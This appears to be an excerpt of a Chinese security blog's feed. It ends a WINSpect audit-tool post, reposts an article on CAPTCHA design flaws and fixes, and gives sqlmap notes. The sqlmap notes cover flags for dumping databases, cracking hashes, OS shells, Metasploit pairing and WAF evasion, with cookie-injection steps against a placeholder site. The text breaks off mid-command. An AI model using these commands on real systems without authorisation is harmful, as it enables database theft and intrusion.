class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> -ExecutionPolicy RemoteSigned</span><br><span class="line"></span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span></span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y</span><br></pre></td></tr></table></figure></p><p>详细内容参考<a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/powershell-scripting/hh847748(v=wps.640" target="_blank" rel="noopener">about_Execution_Policies</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/A-mIn3/WINspect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。&lt;/p&gt;
&lt;h2 id=&quot;0x01-功能&quot;&gt;&lt;a href=&quot;#0x01-功能&quot; class=&quot;headerlink&quot; title=&quot;0x01 功能&quot;&gt;&lt;/a&gt;0x01 功能&lt;/h2&gt;&lt;p&gt;WINSpect将为我们提供审计检查和枚举：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查已安装的安全产品&lt;/li&gt;
&lt;li&gt;检查DLL劫持&lt;/li&gt;
&lt;li&gt;检查用户账户控制设置
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="windows 审计工具" scheme="http://www.pa55w0rd.club/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>如何设计相对安全的图形验证码？ （转发）</title>
    <link href="http://www.pa55w0rd.club/captcha/"/>
    <id>http://www.pa55w0rd.club/captcha/</id>
    <published>2018-11-27T10:02:10.000Z</published>
    <updated>2018-11-27T10:46:09.333Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自 <a href="https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA</a></p></blockquote><h2 id="0x00-验证码是什么"><a href="#0x00-验证码是什么" class="headerlink" title="0x00 验证码是什么"></a>0x00 验证码是什么</h2><p>验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p><h2 id="0x01-有什么作用"><a href="#0x01-有什么作用" class="headerlink" title="0x01 有什么作用"></a>0x01 有什么作用</h2><p>简单概括如下：</p><p>验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　<br><a id="more"></a><br>好了，废话不多说，为了回答我们最初的问题，我们必须要知道图形验证码在设计和使用中有哪些坑，哪些地方容易出问题。</p><h2 id="0x02-设计或使用方法不当"><a href="#0x02-设计或使用方法不当" class="headerlink" title="0x02 设计或使用方法不当"></a>0x02 设计或使用方法不当</h2><ol><li>图形验证码数值在返回包中返回前端(可通过自动化程序输入验证码，导致验证码无效，导致防护失效)</li><li>图形验证码的值由前端生成，发送到后端形成图片</li><li>图形验证码验证后不失效（成功或失败都应该失效）,可以无限复用</li><li>单独验证图形验证码，正确返回1，错误返回0，而认证请求却不包含图形验证码（可以绕过前端验证）</li><li>万能图形验证码（测试环境为方便设置的万能验证码，上线后未关闭）</li><li>验证码参数值为空时不检测图形验证码</li><li>无验证码参数时(参数名和参数值都不存在)不检测图形验证码(一般是之前设计的时候没加图形验证码，后期添加图形验证码时保留了老接口)</li><li>验证码大小值由前端控制,后端无大小检测(生成超大图形验证码，造成内存耗尽，拒绝服务)</li><li>图形验证码过于简单(无扭曲，无干扰线导致，可自动化图像识别)</li><li>认证过程中，先验证账号密码，后验证图形验证码(逻辑顺序有误，验证码起不到防护作用)</li><li>验证码图片中数值不够随机，可预测导致可以猜解。</li></ol><h2 id="0x03-如何设计出一个相对安全的图形验证码"><a href="#0x03-如何设计出一个相对安全的图形验证码" class="headerlink" title="0x03 如何设计出一个相对安全的图形验证码"></a>0x03 如何设计出一个相对安全的图形验证码</h2><p><strong>设计上：</strong></p><ol><li>验证码字符集合和长度应可配置，至少四位，不允许单独使用英文字符或数字。</li><li>验证码要能够置设置背景色、字符颜色、字符旋转、扭曲、字符粘连等，要添加干扰线，干扰线的颜色、尺寸和数量要可通过配置进行设定。</li><li>验证码生成过程中不仅要使用安全随机函数还要确保种子绝对随机的，保证每次生成验证码的唯一性和不可预测性，防止重放攻击。</li><li>针对一次请求生成的验证码只能用一次，用完立即过期。每次生成的验证码不允许跨会话和请求使用。</li><li>验证码内容不允许以任何形式输出到客户端包括验证码的MD5值、 Base64转码值等。</li></ol><p><strong>另外图形验证码使用上应注意：</strong></p><ol><li>验证码参数和认证参数需要一起提交，到后端验证时要先验证验证码，正确后再进行后续认证。</li><li>后台系统中验证码的验证逻辑要先于口令的验证，只有通过验证码的验证后才能进行用户名、口令等其他身份信息的验证过程。</li><li>线上系统不应存在万能验证码，或不验证验证码内容的情况</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自 &lt;a href=&quot;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-验证码是什么&quot;&gt;&lt;a href=&quot;#0x00-验证码是什么&quot; class=&quot;headerlink&quot; title=&quot;0x00 验证码是什么&quot;&gt;&lt;/a&gt;0x00 验证码是什么&lt;/h2&gt;&lt;p&gt;验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。&lt;/p&gt;
&lt;h2 id=&quot;0x01-有什么作用&quot;&gt;&lt;a href=&quot;#0x01-有什么作用&quot; class=&quot;headerlink&quot; title=&quot;0x01 有什么作用&quot;&gt;&lt;/a&gt;0x01 有什么作用&lt;/h2&gt;&lt;p&gt;简单概括如下：&lt;/p&gt;
&lt;p&gt;验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="验证码安全" scheme="http://www.pa55w0rd.club/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全设计" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap笔记</title>
    <link href="http://www.pa55w0rd.club/sqlmap/"/>
    <id>http://www.pa55w0rd.club/sqlmap/</id>
    <published>2018-11-27T09:04:23.000Z</published>
    <updated>2018-11-27T09:06:27.752Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><p>git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a></p><h2 id="0x01-基本用法"><a href="#0x01-基本用法" class="headerlink" title="0x01 基本用法"></a>0x01 基本用法</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-dbs       <span class="string">//</span>列举数据库</span><br><span class="line"><span class="params">--count</span> -D “数据库”   <span class="string">//</span>获取表中数据个数</span><br><span class="line"><span class="params">--current-db</span>           <span class="string">//</span>列举当前数据库</span><br><span class="line"><span class="params">--users</span> <span class="params">--passwords</span>              <span class="string">//</span>列举数据库用户名</span><br><span class="line"><span class="params">--current-user</span>               <span class="string">//</span>列举当前用户</span><br><span class="line"><span class="params">--privileges</span>               <span class="string">//</span>查看权限</span><br><span class="line"><span class="params">--os-shell</span>                    <span class="string">//</span>写web shell</span><br><span class="line"><span class="params">--is-dba</span>                    <span class="string">//</span>判断当前用户是不是dba</span><br><span class="line"><span class="params">--tables</span> -D <span class="string">"数据库"</span>          <span class="string">//</span>列举数据库的表名</span><br><span class="line"><span class="params">--columns</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>       <span class="string">//</span> 列举列名</span><br><span class="line"><span class="params">--dump</span> -C <span class="string">"列名"</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>           <span class="string">//</span>列举数据</span><br><span class="line"><span class="params">--start=</span>：指定开始的行</span><br><span class="line"><span class="params">--stop=</span>：指定结束的行</span><br><span class="line"><span class="params">--threads=</span>:线程数</span><br><span class="line"></span><br><span class="line">存储数据在 <span class="string">./sqlmap/output/.......</span></span><br><span class="line">-f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span> <span class="params">--batch</span> <span class="params">--crawl=3</span></span><br><span class="line">当<span class="params">--level</span>为2以上，会尝试注入cookie</span><br><span class="line">当<span class="params">--level</span>为3以上，会尝试注入user-agent、referer</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">获取目标方式</span><br><span class="line">     -<span class="ruby">u          /<span class="regexp">/指定目标</span></span></span><br><span class="line"><span class="ruby">     -l        /<span class="regexp">/从burp或webscarab代理中获取日志</span></span></span><br><span class="line"><span class="ruby">     -m     /<span class="regexp">/ 从文本中获取多个目标扫描</span></span></span><br><span class="line"><span class="ruby">     -r      /<span class="regexp">/从文件中加载http请求</span></span></span><br><span class="line"><span class="ruby">     -g      /<span class="regexp">/处理google的搜索结果 inurl:\".php?id=1\"       --smart</span></span></span><br><span class="line"><span class="ruby">请求</span></span><br><span class="line"><span class="ruby">     --data     /<span class="regexp">/把数据以post方式提交</span></span></span><br><span class="line"><span class="ruby">     --param-del     /<span class="regexp">/当get或post的数据需要用其他字符分割时    --data="id=1;id=2" --param-del=";"</span></span></span><br><span class="line"><span class="ruby">     --cookie     /<span class="regexp">/http cookie头</span></span></span><br><span class="line"><span class="ruby">     --drop-set-cookie     /<span class="regexp">/拒绝cookie</span></span></span><br><span class="line"><span class="ruby">     --user-agent</span></span><br><span class="line"><span class="ruby">     --random-agent     /<span class="regexp">/修改user-agent参数</span></span></span><br><span class="line"><span class="ruby">     --referer      /<span class="regexp">/伪造referer</span></span></span><br><span class="line"><span class="ruby">     --headers      /<span class="regexp">/增加额外的http头</span></span></span><br><span class="line"><span class="ruby">     --auth-type,--auth-cred      /<span class="regexp">/http认证保护 --auth-type Basic(Basic、Digest、NTLM) --auth-cred "testuser:testpass"</span></span></span><br><span class="line"><span class="ruby">     --auth-cert     /<span class="regexp">/http协议的证书认证</span></span></span><br><span class="line"><span class="ruby">     --proxy     /<span class="regexp">/http代理</span></span></span><br><span class="line"><span class="ruby">     --proxy-cred</span></span><br><span class="line"><span class="ruby">     --ignore-proxy      /<span class="regexp">/拒绝使用本地局域网代理</span></span></span><br><span class="line"><span class="ruby">     --delay      /<span class="regexp">/设定两个请求件的延迟，默认0s</span></span></span><br><span class="line"><span class="ruby">     --timeout     /<span class="regexp">/请求超时判断，默认30s</span></span></span><br><span class="line"><span class="ruby">     --retries     /<span class="regexp">/当超时是，重试次数，默认3次</span></span></span><br><span class="line"><span class="ruby">     --randomize     /<span class="regexp">/使参数值随机改变，长度类型不变</span></span></span><br><span class="line"><span class="ruby">     --scope     /<span class="regexp">/使用正则过滤目标网址，例如：python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"</span></span></span><br><span class="line"><span class="ruby">     --safe-url,--safe-freq     /<span class="regexp">/避免过多错误请求被屏蔽</span></span></span><br><span class="line"><span class="ruby">     --skip-urlencode     /<span class="regexp">/关闭URL参数值编码</span></span></span><br><span class="line"><span class="ruby">     --eval     /<span class="regexp">/执行自定义的python代码</span></span></span><br><span class="line"><span class="ruby">注入</span></span><br><span class="line"><span class="ruby">     -p     /<span class="regexp">/设定想要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --skip     /<span class="regexp">/设定不要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --dbms      /<span class="regexp">/指定数据库</span></span></span><br><span class="line"><span class="ruby">     --os      /<span class="regexp">/指定数据库服务器的系统     </span></span></span><br><span class="line"><span class="ruby">     --invalid-bignum     /<span class="regexp">/指定无效的大数字， 默认情况下id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</span></span></span><br><span class="line"><span class="ruby">     --invalid-logical     /<span class="regexp">/指定无效的逻辑， 可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19</span></span></span><br><span class="line"><span class="ruby">     --tamper     /<span class="regexp">/修改注入的数据，查看 ./tamper</span><span class="regexp">/ 可用脚本</span></span></span><br><span class="line"><span class="ruby">探测</span></span><br><span class="line"><span class="ruby">     --level     /<span class="regexp">/探测等级</span></span></span><br><span class="line"><span class="ruby">     --risk      /<span class="regexp">/风险等级 ，在./xml</span><span class="regexp">/payloads.xml/</span>中</span></span><br><span class="line"><span class="ruby">     --string     /<span class="regexp">/页面比较， 用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在，添加字符串     </span></span></span><br><span class="line"><span class="ruby">     --regexp     /<span class="regexp">/页面比较，添加正则</span></span></span><br><span class="line"><span class="ruby">     --<span class="keyword">not</span>-string     /<span class="regexp">/页面比较， 用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串</span></span></span><br><span class="line"><span class="ruby">     --code     /<span class="regexp">/页面比较， 用户也可以提供真与假条件返回的HTTP状态码不一样来注入</span></span></span><br><span class="line"><span class="ruby">     --text-only     /<span class="regexp">/页面比较， 用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用，http响应体不同</span></span></span><br><span class="line"><span class="ruby">     --titles     /<span class="regexp">/页面比较，html的title标签中不同</span></span></span><br><span class="line"><span class="ruby">注入技术     </span></span><br><span class="line"><span class="ruby">     --technique     /<span class="regexp">/测试是否是注入，指定使用的探测技术，默认会测试所有的方式（B/</span>E/U/S/T）</span></span><br><span class="line"><span class="ruby">     --time-sec     /<span class="regexp">/设定延迟注入的时间，默认5s</span></span></span><br><span class="line"><span class="ruby">     --union-cols     /<span class="regexp">/设定union查询的字段数，默认1-10个字段数</span></span></span><br><span class="line"><span class="ruby">     --union-char     /<span class="regexp">/设定union查询使用的字符</span></span></span><br><span class="line"><span class="ruby">     --second-order     /<span class="regexp">/二阶sql注入， 有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。 --second-order后面跟一个判断页面的URL地址。</span></span></span><br><span class="line"><span class="ruby">列数据</span></span><br><span class="line"><span class="ruby">     -b,--banner     /<span class="regexp">/标志，返回数据库的版本号</span></span></span><br><span class="line"><span class="ruby">     --current-db     /<span class="regexp">/返回当前链接的数据库</span></span></span><br><span class="line"><span class="ruby">     --is-dba     /<span class="regexp">/判断当前用户是否为管理</span></span></span><br><span class="line"><span class="ruby">     --users     /<span class="regexp">/列数据库管理用户</span></span></span><br><span class="line"><span class="ruby">     --passwords     /<span class="regexp">/列出用户和用户的hash，并尝试破解</span></span></span><br><span class="line"><span class="ruby">     --privileges     /<span class="regexp">/列出数据库管理员权限</span></span></span><br><span class="line"><span class="ruby">     --roles     /<span class="regexp">/勒出数据库管理员角色，仅适用于Oracle</span></span></span><br><span class="line"><span class="ruby">     --dbs     /<span class="regexp">/列出数据库系统的数据库</span></span></span><br><span class="line"><span class="ruby">     --tables     /<span class="regexp">/列举数据库表，--exclude-sysdbs指不包含了所有的系统数据库，-D指定数据库</span></span></span><br><span class="line"><span class="ruby">     --columns     /<span class="regexp">/列出指定数据库表中的字段和数据类型，-D 指定数据库，-T 指定表</span></span></span><br><span class="line"><span class="ruby">     --schema     /<span class="regexp">/列举数据库系统的架构， 包含所有的数据库，表和字段，以及各自的类型。 --exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</span></span></span><br><span class="line"><span class="ruby">     --count     /<span class="regexp">/获取表中数据个数</span></span></span><br><span class="line"><span class="ruby">     --dump      /<span class="regexp">/获取整个表的数据，-D-T指定要获取哪个库哪个表，--start,--stop,--first,--last</span></span></span><br><span class="line"><span class="ruby">     --dump-all     /<span class="regexp">/获取所有数据库表的内容， 加上--exclude-sysdbs只获取用户数据库的表，/</span>*脱裤啊*<span class="regexp">/</span></span></span><br><span class="line"><span class="ruby">     --search     /<span class="regexp">/搜索-C列名，-T表，-D数据库</span></span></span><br><span class="line"><span class="ruby">     --sql-query,--sql-shell     /<span class="regexp">/运行自定义sql语句</span></span></span><br><span class="line"><span class="ruby">爆破</span></span><br><span class="line"><span class="ruby">     --common-tables     /<span class="regexp">/暴力破解表名  </span></span></span><br><span class="line"><span class="ruby">     --common-columns     /<span class="regexp">/暴力破解列名</span></span></span><br><span class="line"><span class="ruby">用户自定义函数注入</span></span><br><span class="line"><span class="ruby">     --udf-inject,--shared-lib     </span></span><br><span class="line"><span class="ruby">系统文件操作</span></span><br><span class="line"><span class="ruby">     --file-read     /<span class="regexp">/从数据库服务器中读取文件</span></span></span><br><span class="line"><span class="ruby">     --file-write,--file-dest     /<span class="regexp">/把文件上传到数据库服务器中</span></span></span><br><span class="line"><span class="ruby">     --os-cmd,--os-shell     /<span class="regexp">/运行任意操作系统命令</span></span></span><br><span class="line"><span class="ruby">Meterpreter配合使用</span></span><br><span class="line"><span class="ruby">     --os-pwn --msf-path /software/metasploit</span></span><br><span class="line"><span class="ruby">     --os-smbrelay     /<span class="regexp">/通过smb攻击</span></span></span><br><span class="line"><span class="ruby">     --os-bof     /<span class="regexp">/通过溢出</span></span></span><br><span class="line"><span class="ruby">     --tmp-path</span></span><br><span class="line"><span class="ruby">     --priv-esc</span></span><br><span class="line"><span class="ruby">对Windows注册表操作</span></span><br><span class="line"><span class="ruby">     --reg-read     /<span class="regexp">/读取注册表</span></span></span><br><span class="line"><span class="ruby">     --reg-add     /<span class="regexp">/写入</span></span></span><br><span class="line"><span class="ruby">     --reg-del     /<span class="regexp">/删除</span></span></span><br><span class="line"><span class="ruby">     --reg-key,--reg-value,--reg-data,--reg-type     /<span class="regexp">/辅助选项</span></span></span><br><span class="line"><span class="ruby">常规参数</span></span><br><span class="line"><span class="ruby">     -s     /<span class="regexp">/从sqlit中读取session， sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数</span></span></span><br><span class="line"><span class="ruby">     -t     /<span class="regexp">/保存http日志，需要跟一个文本文件</span></span></span><br><span class="line"><span class="ruby">     --batch     /<span class="regexp">/非交互模式，使用默认值一直运行下去</span></span></span><br><span class="line"><span class="ruby">     --charset=     <span class="regexp">//</span>强制使用字符编码</span></span><br><span class="line"><span class="ruby">     --crawl=    <span class="regexp">//</span>爬行网站URL,后面跟深度，收集潜在的可能存在漏洞的链接</span></span><br><span class="line"><span class="ruby">     --csv-del=<span class="string">";"</span>     /<span class="regexp">/规定输出到csv中的分隔符，默认逗号</span></span></span><br><span class="line"><span class="ruby">     --dbms-cred     /<span class="regexp">/dbms身份验证 某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数。</span></span></span><br><span class="line"><span class="ruby">     --dump-format     /<span class="regexp">/定义dump数据的格式（ CSV，HTML，SQLITE ）</span></span></span><br><span class="line"><span class="ruby">     --eta     /<span class="regexp">/预估完成时间</span></span></span><br><span class="line"><span class="ruby">     --flush-session     /<span class="regexp">/刷新session文件</span></span></span><br><span class="line"><span class="ruby">     --forms     /<span class="regexp">/自动获取form表单测试</span></span></span><br><span class="line"><span class="ruby">     --fresh-queries     /<span class="regexp">/忽略在回话文件中存储的查询结果</span></span></span><br><span class="line"><span class="ruby">     --hex     /<span class="regexp">/使用DBMS的hex函数， 有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免</span></span></span><br><span class="line"><span class="ruby">     --output-dir=    <span class="regexp">//</span>自定义输出的路径</span></span><br><span class="line"><span class="ruby">     --parse-errors     /<span class="regexp">/从响应中获取DBMS的错误信息</span></span></span><br><span class="line"><span class="ruby">其他参数缩写</span></span><br><span class="line"><span class="ruby">     -z     /<span class="regexp">/使用参数缩写，--batch --random-agent --ignore-proxy --technique=BEU -u，可以写成-z "bat,randoma,ign,tec=BEU" -u，还有--ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u，可以写成-z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u</span></span></span><br><span class="line"><span class="ruby">     --alert     /<span class="regexp">/成功注入时警告，</span></span></span><br><span class="line"><span class="ruby">     --answers=      <span class="regexp">//</span>设定会发的答案, 当sqlmap提出输入时，自动输入自己想要的答案可以使用此参数</span></span><br><span class="line"><span class="ruby">     --beep     /<span class="regexp">/发现sql注入时发出蜂鸣声</span></span></span><br><span class="line"><span class="ruby">     --check-waf     /<span class="regexp">/启发式检测WAF/</span>IPS/IDS保护， 使用一个不存在的参数来注入测试</span></span><br><span class="line"><span class="ruby">     --cleanup     /<span class="regexp">/清理sqlmap注入时产生的UDF(s)和表</span></span></span><br><span class="line"><span class="ruby">     --disable-coloring     /<span class="regexp">/禁止彩色输出</span></span></span><br><span class="line"><span class="ruby">     --gpage     /<span class="regexp">/使用指定的Google结果页面</span></span></span><br><span class="line"><span class="ruby">     --hpp     /<span class="regexp">/使用http参数污染， 可能会绕过WAF/</span>IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效</span></span><br><span class="line"><span class="ruby">     --identify-waf     /<span class="regexp">/测试WAF/</span>IPS/IDS保护</span></span><br><span class="line"><span class="ruby">     --mobile     /<span class="regexp">/模仿智能手机</span></span></span><br><span class="line"><span class="ruby">     --purgr-output     /<span class="regexp">/安全的删除output目录的文件</span></span></span><br><span class="line"><span class="ruby">     --smart     /<span class="regexp">/启发式判断注入， 对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入</span></span></span><br><span class="line"><span class="ruby">     --wizard     /<span class="regexp">/初级用户向导参数，可以一步一步教你如何输入针对目标注入</span></span></span><br></pre></td></tr></table></figure><h2 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> <span class="comment">//查是否有注入，一些基本信息</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dbs <span class="comment">//枚举数据库</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --tables -D 数据库名 <span class="comment">//表名枚举</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --<span class="attribute">columns</span> -D 数据库名 -T 数据库表名 //字段枚举</span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dump -D 数据库名 -T 表名 -C <span class="string">"字段名1，字段名2，字段名3"</span> <span class="comment">//dump</span></span><br></pre></td></tr></table></figure><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>cookie注入常见有两种，一种是cookie中的值拼接成sql语句产生注入<br>另一种asp的cookie中转注入，原因是程序对提交数据获取方式是直接request(“c.s.t”)的方式.未指明使用request对象的具体方法进行获取。可以都接收get,post,cookie方式提交的数据，一般程序只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</p><p>这里对第二种进行简单判断是否存在cookie注入的可能，</p><ol><li>首先要访问正常的页面，即是：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp?id=1，等页面打开之后，我们将IE地址栏清空，然后写 上:<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1&quot;));</code> 这里的“id=”便是“test.asp?id=1”中的“id=”，“escape(“1”)”中的“1”是 “test.asp?id=1”中的“id=1”了，这两处要根据实际情`况来定义。之后按下回车网页中会弹出一个对话框。</li><li>更改好了cookie后，我们就要试下能不能正常访问了，在另外一个窗口中我们打开以下地址：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp? 既是将“id=1”去掉后的，然后看是否能正常访问。<br>如果可以正常显示，那么就是以request(“c.s.t”)方式获取数据的，一般只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</li><li>通过修改escape中的参数来判断是否存在注入，接下来和普通注入判断方式一样</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --level <span class="number">2</span> 枚举强度</span><br><span class="line">python 